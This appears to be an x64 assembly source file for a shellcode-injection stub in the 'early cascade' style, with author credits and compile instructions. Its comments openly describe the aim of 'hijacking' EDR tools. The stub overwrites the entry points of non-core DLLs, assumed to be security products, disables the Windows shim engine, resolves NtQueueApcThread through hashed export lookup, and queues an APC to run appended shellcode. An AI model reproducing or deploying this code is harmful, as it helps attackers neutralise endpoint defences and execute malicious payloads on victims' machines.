;-------------------------------------------------------;
;   Author  => Abdallah Mohamed ( 0xNinjaCyclone )      ;
;   Email   => elsharifabdallah53@gmail.com             ;
;   Date    => January 7, 2025                          ;
;   Compile => nasm -f bin -O3 -o stub.bin stub.asm     ;
;-------------------------------------------------------;


[BITS 64]

cascade:
    push rsi                            ; Save the source register
    push rdi                            ; Save the dest register
    mov rdx, qword gs:[60h]             ; Getting Process Environment Block Address ( PPEB )
    mov rdx, qword [rdx+18h]            ; Fetching the Loader data address ( PPEB->Ldr )
    lea rdx, qword [rdx+20h]            ; Load MemoryOrderList Address
    push rdx                            ; Pushing it onto stack
    mov rdx, qword [rdx]                ; We are skipping the main module

preempt_edr:
    mov rdx, qword [rdx]                ; Next module
    cmp rdx, qword [rsp]                ; Check if we've done a full circuit round
    je preempt_done
    mov rsi, qword [rdx+50h]            ; Current DLL name
    movzx rcx, word [rdx+4Ah]           ; Length of DLL name
    add rcx, 0ah                        ; For f*cking NUL & Alignment
    and rcx, 0FFFFFFFFFFFFFFF0h         ; Ensuring alignment
    sub rsp, rcx                        ; Momory for the ANSI version
    mov r9, rcx                         ; Save the size of reserved memory
    xor rcx, rcx                        ; Clear the counter

adjust_name:
    xor rax, rax                        ; Clear the buffer
    lodsw                               ; We need to read as word 
    cmp al, ah                          ; Is that a NUL?
    jz hunt_edr                         ; We are ready!
    cmp al, 61h                         ; Hashes calculated in lower case, so we have to check
    jge str_lower                       ; Current char looks like in upper case? 
    cmp al, 41h                         ; Maybe a dot or something else (ensure that)
    jl str_lower                        ; Yep, we should not pay attention to it
    add al, 20h                         ; Nope?, convert it. 

str_lower:
    mov byte [rsp+rcx], al              ; Write the character into the buffer
    inc rcx                             ; Increamenting the counter
    jmp adjust_name                     ; Keep adjusting

hunt_edr:
    mov byte [rsp+rcx], 0               ; Mark the end of the string
    mov rsi, rsp                        ; Now, rsi is a pointer to the ANSI string
    call str_hash                       ; Compute the hash
    add rsp, r9                         ; We don't need that string anymore 
    mov rsi, 377D2B522D3B5EDh           ; hashing result of "ntdll.dll"
    cmp rsi, rdi                        ; Check if current module is NtDLL 
    je preempt_edr                      ; Yes?, that's allowed
    mov rsi, 0D537E9367040EE75h         ; hashing result of "kernel32.dll"
    cmp rsi, rdi                        
    je preempt_edr
    mov rsi, 2D71274A721952Bh           ; hashing result of "kernelbase.dll"
    cmp rsi, rdi
    je preempt_edr

    ; EDR Tools wanna mess with us, let's hijacking it!
    call edr_clobbering
    jmp just_return_zero

edr_clobbering: ; No other modules supposed to be loaded that early
    pop rax                             ; Own procedure for redirecting EDRs to
    mov qword [rdx+30h], rax            ; Kicking EDRs entrypoints off
    jmp preempt_edr                     ; Don't stop until clobbering all

preempt_done:
    pop rdx                             ; Restore the MemoryOrderList
    mov rax, 1111111111111111h          ; Pointer to g_ShimsEnabled flag
    mov byte [rax], 0h                  ; Disable Shim Engine
    mov rdx, qword [rdx]                ; We points now to the main entry
    mov rdx, qword [rdx]                ; Jump into the entry of NtDLL
    mov rdx, qword [rdx+20h]            ; NtDLL Base Address
    xor rax, rax                        ; Clear the accumulator register
    mov eax, dword [rdx+3Ch]            ; Getting Image NT Headers RVA
    add rax, rdx                        ; Jump into the Image NT Headers
    cmp word [rax+0x18], 020Bh          ; Checking "Machine" member in the File Header
    jne finish
    mov eax, dword [rax+88h]            ; Getting Export Tables RVA from Data Directory Table
    add rax, rdx                        ; Jump into there
    push rax                            ; Save Export Tables Address
    xor r11, r11                        ; Clear the register
    mov r11d, dword [rax+20h]           ; Export Name Table RVA ( ENT )
    add r11, rdx                        ; Jump into there
    xor rcx, rcx                        ; Clear the counter register
    mov ecx, dword [rax+18h]            ; Number of functions
    push rcx                            ; Save the number of functions to be used later

find_queueapc_api:
    test rcx, rcx                       ; Check the end of the table
    jz api_notfound                     ; We f*cked up, "NtQueueApcThread" cannot be found!
    xor rsi, rsi                        ; Clear the source
    mov esi, dword [r11]                ; Looking up the ENT
    add rsi, rdx                        ; Getting a pointer to the function name
    call str_hash                       ; Calculating the hash of current function name

check_function:
    add r11, 4h                         ; Jump into the next entry in the table
    dec rcx                             ; Decrement our counter
    mov rsi, 9963DF7CD4612238h          ; DJB2 Hash of "NtQueueApcThread"
    cmp rsi, rdi                        ; Compare with the API we search for
    jne find_queueapc_api
    pop rax                             ; Restoring the number of functions
    inc ecx                             ; We need to make the ecx equal to the remaining exports+1
    sub eax, ecx                        ; Calculating the desired ordinal index
    xchg eax, ecx                       ; Just toggling
    pop rax                             ; Restoring the Export Tables Address
    mov r11d, dword [rax+24h]           ; Export Ordinal Table RVA 
    add r11, rdx                        ; Jump into there 
    mov cx, word [r11+2h*rcx]           ; Fetching the ordinal
    mov r11d, dword [rax+1ch]           ; Export Address Table RVA ( EAT )
    add r11, rdx                        ; Jump into there 
    mov eax, dword [r11+4h*rcx]         ; Fetching the function RVA
    add rax, rdx                        ; Finally, we have the API Address
    jmp shellcode

fire:
    mov rcx, -2                         ; ThreadHandle ( Current thread )
    pop rdx                             ; ApcRoutine ( Shellcode address )
    xor r8, r8                          ; ApcRoutineContext ( NULL )
    xor r9, r9                          ; ApcStatusBlock ( NULL )
    push r9                             ; ApcReserved ( NULL )
    push r9                             ; Alignment
    sub rsp, 20h                        ; Reserve ( sizeof(QWORD) * 4 )
    call rax                            ; Invoke "NtQueueApcThread"
    add rsp, 30h                        ; Clear off the stack

finish:
    pop rdi
    pop rsi

just_return_zero:
    xor rax, rax
    ret

api_notfound:
    pop rcx
    pop rax
    jmp finish

str_hash:
    mov rdi, 5381                       ; DJB2 Magic

compute_hash: ; DJB2 Hashing Algorithm
    xor rax, rax                        ; rax is utilized to reads the string
    lodsb                               ; Fetch a charecter
    cmp al, ah                          ; End of the string!?
    je hash_computed                    ; Don3, go back to the caller
    mov r8, rdi                         ; Save the computed value
    shl rdi, 5                          ; Value << 5
    add rdi, r8                         ; Value += OldValue
    add rdi, rax                        ; Value += ASCII(c)
    jmp compute_hash

hash_computed:
    ret

shellcode:
    call fire
